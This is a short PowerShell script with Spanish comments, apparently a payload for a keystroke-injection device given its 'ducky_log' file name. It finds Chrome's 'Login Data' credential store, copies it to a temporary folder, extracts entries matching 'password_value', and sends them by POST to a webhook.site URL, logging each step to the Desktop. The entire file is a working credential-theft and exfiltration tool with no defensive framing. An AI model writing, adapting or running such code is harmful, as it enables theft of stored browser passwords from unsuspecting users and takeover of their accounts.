$log = "$env:USERPROFILE\Desktop\ducky_log.txt"
"--- Inicio de Script ---" | Out-File $log

# Intentar encontrar la ruta correcta (Default o Profile 1)
$basePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
$path = ""

if (Test-Path "$basePath\Default\Login Data") {
    $path = "$basePath\Default\Login Data"
} elseif (Test-Path "$basePath\Profile 1\Login Data") {
    $path = "$basePath\Profile 1\Login Data"
}

if ($path -and (Test-Path $path)) {
    "Archivo encontrado en: $path" | Out-File $log -Append
    try {
        # Intentamos copiar el archivo para evitar el bloqueo de "Archivo en uso"
        $tempPath = "$env:TEMP\chrome_data_copy.db"
        Copy-Item $path $tempPath -ErrorAction Stop
        "Copiado exitoso a carpeta temporal." | Out-File $log -Append
        
        # Leer contenido
        $data = Get-Content $tempPath -Raw | Select-String "password_value"
        
        if ($data) {
            "Datos extraídos. Enviando al Webhook..." | Out-File $log -Append
            # Tu nueva URL de Webhook
            $url = "https://webhook.site/3fa59b0e-4157-4c9e-a72b-4803657bd464"
            $payload = [System.Text.Encoding]::UTF8.GetBytes($data)
            
            Invoke-WebRequest -UseBasicParsing -Uri $url -Method POST -Body $payload
            "Enviado exitosamente a Webhook." | Out-File $log -Append
        } else {
            "No se encontraron 'password_value' en el archivo. Puede que las contraseñas no estén guardadas o el archivo esté vacío." | Out-File $log -Append
        }
    } catch {
        "ERROR durante la ejecución: $($_.Exception.Message)" | Out-File $log -Append
    }
} else {
    "ERROR: No se pudo localizar el archivo Login Data en ninguna ruta estándar." | Out-File $log -Append
}

"--- Fin del Script ---" | Out-File $log -Append
